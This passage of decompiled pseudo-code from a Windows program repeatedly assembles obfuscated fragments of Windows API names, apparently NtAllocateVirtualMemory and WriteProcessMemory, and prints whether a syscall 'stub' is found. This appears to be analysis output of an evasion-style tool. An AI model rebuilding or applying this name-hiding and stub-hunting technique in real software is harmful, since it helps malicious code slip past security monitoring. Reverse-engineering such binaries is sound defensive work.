fcn.1400ba740(&stack0x000002e8 + iVar5, &stack0x00000308 + iVar5, \n                  L\"eViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400042c2;\n    fcn.1400ba740(&stack0x000002c8 + iVar5, &stack0x000002e8 + iVar5, \n                  L\"my\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400042df;\n    fcn.1400ba740(&stack0x000002a8 + iVar5, &stack0x000002c8 + iVar5, \n                  L\"ocaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400042fc;\n    fcn.1400ba740(&stack0x00000288 + iVar5, &stack0x000002a8 + iVar5, \n                  L\"ruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004319;\n    fcn.1400ba740(&stack0x00000238 + iVar5, &stack0x00000288 + iVar5, \n                  L\"y\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004328;\n    fcn.1400aa2e0(&stack0x00000288 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004337;\n    fcn.1400aa2e0(&stack0x000002a8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004346;\n    fcn.1400aa2e0(&stack0x000002c8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004355;\n    fcn.1400aa2e0(&stack0x000002e8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004364;\n    fcn.1400aa2e0(&stack0x00000308 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004373;\n    fcn.1400aa2e0(&stack0x00000328 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004382;\n    fcn.1400aa2e0(&stack0x00000348 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004391;\n    fcn.1400aa2e0(&stack0x00000368 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400043a0;\n    fcn.1400aa2e0(&stack0x00000388 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400043af;\n    fcn.1400aa2e0(&stack0x000003a8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400043be;\n    fcn.1400aa2e0(&stack0x000003c8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400043cd;\n    fcn.1400aa2e0(&stack0x000003e8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400043dc;\n    fcn.1400aa2e0(&stack0x00000408 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400043eb;\n    fcn.1400aa2e0(&stack0x00000428 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400043fa;\n    fcn.1400aa2e0(&stack0x00000448 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004409;\n    fcn.1400aa2e0(&stack0x00000468 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004418;\n    fcn.1400aa2e0(&stack0x00000488 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004427;\n    fcn.1400aa2e0(&stack0x000004a8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004436;\n    fcn.1400aa2e0(&stack0x000004c8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004445;\n    fcn.1400aa2e0(&stack0x000004e8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004454;\n    fcn.1400aa2e0(&stack0x00000508 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004463;\n    fcn.1400aa2e0(&stack0x00000528 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004472;\n    fcn.140072290(&stack0x00000557 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004488;\n    fcn.1400a9730(&stack0x00000558 + iVar5, &stack0x00000238 + iVar5);\n    uVar6 = *(&stack0x00002f68 + iVar5);\n    *(&stack0x00000010 + iVar5) = *(&stack0x00003020 + iVar5);\n    *(&stack0x00000008 + iVar5) = *(&stack0x00003038 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400044c4;\n    uVar3 = fcn.1400015bd(&stack0x00000558 + iVar5, *(&stack0x00002f60 + iVar5), *(&stack0x00002f88 + iVar5), uVar6, \n                          *(&stack0x00000008 + iVar5), *(&stack0x00000010 + iVar5));\n    *(&stack0x00002f5c + iVar5) = uVar3;\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400044d9;\n    fcn.1400aa2e0(&stack0x00000558 + iVar5);\n    if (*(&stack0x00002f5c + iVar5) == 0) {\n        uVar8 = 0x14010a561;\n    }\n    else {\n        uVar8 = 0x14010a55c;\n    }\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004501;\n    uVar7 = fcn.14002fa60(&stack0x00000238 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004516;\n    fcn.140001530(\"%s Stub Found: %s\\n\", uVar7, uVar8, uVar6);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004525;\n    fcn.140072260(&stack0x00000807 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004545;\n    fcn.1400a9bc0(&stack0x000007d8 + iVar5, \n                  L\"NtAlocaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\", \n                  &stack0x00000807 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004562;\n    fcn.1400ba740(&stack0x000007b8 + iVar5, &stack0x000007d8 + iVar5, \n                  L\"tAlocaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000457f;\n    fcn.1400ba740(&stack0x00000798 + iVar5, &stack0x000007b8 + iVar5, L\"WPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000459c;\n    fcn.1400ba740(&stack0x00000778 + iVar5, &stack0x00000798 + iVar5, \n                  L\"ruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400045b9;\n    fcn.1400ba740(&stack0x00000758 + iVar5, &stack0x00000778 + iVar5, \n                  L\"iruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400045d6;\n    fcn.1400ba740(&stack0x00000738 + iVar5, &stack0x00000758 + iVar5, \n                  L\"tAlocaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400045f3;\n    fcn.1400ba740(&stack0x00000718 + iVar5, &stack0x00000738 + iVar5, \n                  L\"eViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004610;\n    fcn.1400ba740(&stack0x000006f8 + iVar5, &stack0x00000718 + iVar5, \n                  L\"ViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000462d;\n    fcn.1400ba740(&stack0x000006d8 + iVar5, &stack0x000006f8 + iVar5, \n                  L\"iruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000464a;\n    fcn.1400ba740(&stack0x000006b8 + iVar5, &stack0x000006d8 + iVar5, \n                  L\"ruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004667;\n    fcn.1400ba740(&stack0x00000698 + iVar5, &stack0x000006b8 + iVar5, \n                  L\"tAlocaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004684;\n    fcn.1400ba740(&stack0x00000678 + iVar5, &stack0x00000698 + iVar5, \n                  L\"uMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400046a1;\n    fcn.1400ba740(&stack0x00000658 + iVar5, &stack0x00000678 + iVar5, \n                  L\"aeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400046be;\n    fcn.1400ba740(&stack0x00000638 + iVar5, &stack0x00000658 + iVar5, \n                  L\"locaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400046db;\n    fcn.1400ba740(&stack0x00000618 + iVar5, &stack0x00000638 + iVar5, \n                  L\"Mmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400046f8;\n    fcn.1400ba740(&stack0x000005f8 + iVar5, &stack0x00000618 + iVar5, \n                  L\"eViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004715;\n    fcn.1400ba740(&stack0x000005d8 + iVar5, &stack0x000005f8 + iVar5, \n                  L\"my\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004732;\n    fcn.1400ba740(&stack0x000005b8 + iVar5, &stack0x000005d8 + iVar5, \n                  L\"ocaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000474f;\n    fcn.1400ba740(&stack0x00000598 + iVar5, &stack0x000005b8 + iVar5, \n                  L\"ruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000476c;\n    fcn.1400ba740(&stack0x00000578 + iVar5, &stack0x00000598 + iVar5, \n                  L\"y\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004782;\n    fcn.1400aa320(&stack0x00000238 + iVar5, &stack0x00000578 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004791;\n    fcn.1400aa2e0(&stack0x00000578 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400047a0;\n    fcn.1400aa2e0(&stack0x00000598 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400047af;\n    fcn.1400aa2e0(&stack0x000005b8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400047be;\n    fcn.1400aa2e0(&stack0x000005d8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400047cd;\n    fcn.1400aa2e0(&stack0x000005f8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400047dc;\n    fcn.1400aa2e0(&stack0x00000618 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400047eb;\n    fcn.1400aa2e0(&stack0x00000638 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400047fa;\n    fcn.1400aa2e0(&stack0x00000658 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004809;\n    fcn.1400aa2e0(&stack0x00000678 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004818;\n    fcn.1400aa2e0(&stack0x00000698 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004827;\n    fcn.1400aa2e0(&stack0x000006b8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004836;\n    fcn.1400aa2e0(&stack0x000006d8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004845;\n    fcn.1400aa2e0(&stack0x000006f8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004854;\n    fcn.1400aa2e0(&stack0x00000718 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004863;\n    fcn.1400aa2e0(&stack0x00000738 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004872;\n    fcn.1400aa2e0(&stack0x00000758 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004881;\n    fcn.1400aa2e0(&stack0x00000778 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004890;\n    fcn.1400aa2e0(&stack0x00000798 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000489f;\n    fcn.1400aa2e0(&stack0x000007b8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400048ae;\n    fcn.1400aa2e0(&stack0x000007d8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400048bd;\n    fcn.140072290(&stack0x00000807 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400048d3;\n    fcn.1400a9730(&stack0x00000808 + iVar5, &stack0x00000238 + iVar5);\n    uVar6 = *(&stack0x00002f68 + iVar5);\n    *(&stack0x00000010 + iVar5) = *(&stack0x00003018 + iVar5);\n    *(&stack0x00000008 + iVar5) = *(&stack0x00003038 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000490f;\n    uVar3 = fcn.1400015bd(&stack0x00000808 + iVar5, *(&stack0x00002f60 + iVar5), *(&stack0x00002f88 + iVar5), uVar6, \n                          *(&stack0x00000008 + iVar5), *(&stack0x00000010 + iVar5));\n    *(&stack0x00002f5c + iVar5) = uVar3;\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004924;\n    fcn.1400aa2e0(&stack0x00000808 + iVar5);\n    if (*(&stack0x00002f5c + iVar5) == 0) {\n        uVar8 = 0x14010a561;\n    }\n    else {\n        uVar8 = 0x14010a55c;\n    }\n    *(&fcn.14000391d::var_18h + iVar5) = 0x14000494c;\n    uVar7 = fcn.14002fa60(&stack0x00000238 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004961;\n    fcn.140001530(\"%s Stub Found: %s\\n\", uVar7, uVar8, uVar6);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004970;\n    fcn.140072260(&stack0x00000af7 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004990;\n    fcn.1400a9bc0(&stack0x00000ac8 + iVar5, \n                  L\"NtAlocaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\", \n                  &stack0x00000af7 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400049ad;\n    fcn.1400ba740(&stack0x00000aa8 + iVar5, &stack0x00000ac8 + iVar5, \n                  L\"tAlocaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400049ca;\n    fcn.1400ba740(&stack0x00000a88 + iVar5, &stack0x00000aa8 + iVar5, L\"PCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x1400049e7;\n    fcn.1400ba740(&stack0x00000a68 + iVar5, &stack0x00000a88 + iVar5, \n                  L\"ruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004a04;\n    fcn.1400ba740(&stack0x00000a48 + iVar5, &stack0x00000a68 + iVar5, \n                  L\"ocaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004a21;\n    fcn.1400ba740(&stack0x00000a28 + iVar5, &stack0x00000a48 + iVar5, \n                  L\"tAlocaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004a3e;\n    fcn.1400ba740(&stack0x00000a08 + iVar5, &stack0x00000a28 + iVar5, \n                  L\"eViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004a5b;\n    fcn.1400ba740(&stack0x000009e8 + iVar5, &stack0x00000a08 + iVar5, \n                  L\"caeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004a78;\n    fcn.1400ba740(&stack0x000009c8 + iVar5, &stack0x000009e8 + iVar5, \n                  L\"tAlocaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004a95;\n    fcn.1400ba740(&stack0x000009a8 + iVar5, &stack0x000009c8 + iVar5, \n                  L\"ViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004ab2;\n    fcn.1400ba740(&stack0x00000988 + iVar5, &stack0x000009a8 + iVar5, \n                  L\"iruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004acf;\n    fcn.1400ba740(&stack0x00000968 + iVar5, &stack0x00000988 + iVar5, \n                  L\"ruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004aec;\n    fcn.1400ba740(&stack0x00000948 + iVar5, &stack0x00000968 + iVar5, \n                  L\"tAlocaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004b09;\n    fcn.1400ba740(&stack0x00000928 + iVar5, &stack0x00000948 + iVar5, \n                  L\"uMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004b26;\n    fcn.1400ba740(&stack0x00000908 + iVar5, &stack0x00000928 + iVar5, \n                  L\"aeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004b43;\n    fcn.1400ba740(&stack0x000008e8 + iVar5, &stack0x00000908 + iVar5, \n                  L\"locaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004b60;\n    fcn.1400ba740(&stack0x000008c8 + iVar5, &stack0x000008e8 + iVar5, \n                  L\"Mmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004b7d;\n    fcn.1400ba740(&stack0x000008a8 + iVar5, &stack0x000008c8 + iVar5, \n                  L\"eViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004b9a;\n    fcn.1400ba740(&stack0x00000888 + iVar5, &stack0x000008a8 + iVar5, \n                  L\"my\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004bb7;\n    fcn.1400ba740(&stack0x00000868 + iVar5, &stack0x00000888 + iVar5, \n                  L\"ocaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004bd4;\n    fcn.1400ba740(&stack0x00000848 + iVar5, &stack0x00000868 + iVar5, \n                  L\"ruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004bf1;\n    fcn.1400ba740(&stack0x00000828 + iVar5, &stack0x00000848 + iVar5, \n                  L\"y\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004c07;\n    fcn.1400aa320(&stack0x00000238 + iVar5, &stack0x00000828 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004c16;\n    fcn.1400aa2e0(&stack0x00000828 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004c25;\n    fcn.1400aa2e0(&stack0x00000848 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004c34;\n    fcn.1400aa2e0(&stack0x00000868 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004c43;\n    fcn.1400aa2e0(&stack0x00000888 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004c52;\n    fcn.1400aa2e0(&stack0x000008a8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004c61;\n    fcn.1400aa2e0(&stack0x000008c8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004c70;\n    fcn.1400aa2e0(&stack0x000008e8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004c7f;\n    fcn.1400aa2e0(&stack0x00000908 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004c8e;\n    fcn.1400aa2e0(&stack0x00000928 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004c9d;\n    fcn.1400aa2e0(&stack0x00000948 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004cac;\n    fcn.1400aa2e0(&stack0x00000968 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004cbb;\n    fcn.1400aa2e0(&stack0x00000988 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004cca;\n    fcn.1400aa2e0(&stack0x000009a8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004cd9;\n    fcn.1400aa2e0(&stack0x000009c8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004ce8;\n    fcn.1400aa2e0(&stack0x000009e8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004cf7;\n    fcn.1400aa2e0(&stack0x00000a08 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004d06;\n    fcn.1400aa2e0(&stack0x00000a28 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004d15;\n    fcn.1400aa2e0(&stack0x00000a48 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004d24;\n    fcn.1400aa2e0(&stack0x00000a68 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004d33;\n    fcn.1400aa2e0(&stack0x00000a88 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004d42;\n    fcn.1400aa2e0(&stack0x00000aa8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004d51;\n    fcn.1400aa2e0(&stack0x00000ac8 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004d60;\n    fcn.140072290(&stack0x00000af7 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004d76;\n    fcn.1400a9730(&stack0x00000af8 + iVar5, &stack0x00000238 + iVar5);\n    uVar6 = *(&stack0x00002f68 + iVar5);\n    *(&stack0x00000010 + iVar5) = *(&stack0x00003010 + iVar5);\n    *(&stack0x00000008 + iVar5) = *(&stack0x00003038 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004db2;\n    uVar3 = fcn.1400015bd(&stack0x00000af8 + iVar5, *(&stack0x00002f60 + iVar5), *(&stack0x00002f88 + iVar5), uVar6, \n                          *(&stack0x00000008 + iVar5), *(&stack0x00000010 + iVar5));\n    *(&stack0x00002f5c + iVar5) = uVar3;\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004dc7;\n    fcn.1400aa2e0(&stack0x00000af8 + iVar5);\n    if (*(&stack0x00002f5c + iVar5) == 0) {\n        uVar8 = 0x14010a561;\n    }\n    else {\n        uVar8 = 0x14010a55c;\n    }\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004def;\n    uVar7 = fcn.14002fa60(&stack0x00000238 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004e04;\n    fcn.140001530(\"%s Stub Found: %s\\n\", uVar7, uVar8, uVar6);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004e13;\n    fcn.140072260(&stack0x00000d27 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004e33;\n    fcn.1400a9bc0(&stack0x00000cf8 + iVar5, \n                  L\"NtAlocaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\", \n                  &stack0x00000d27 + iVar5);\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004e50;\n    fcn.1400ba740(&stack0x00000cd8 + iVar5, &stack0x00000cf8 + iVar5, \n                  L\"tAlocaeViruMmy\u7274\u6575\u6600\u6c61\u6573\u2500\u2073\u7453\u6275\u4620\u756f\u646e\u203a\u7325\\nWPCThdExRsFSngObjQIfpGDw\");\n    *(&fcn.14000391d::var_18h + iVar5) = 0x140004e6d;\n    fcn.1400ba740(&stack0x00000cb8 + iVar5, &stack0x00000cd8 + 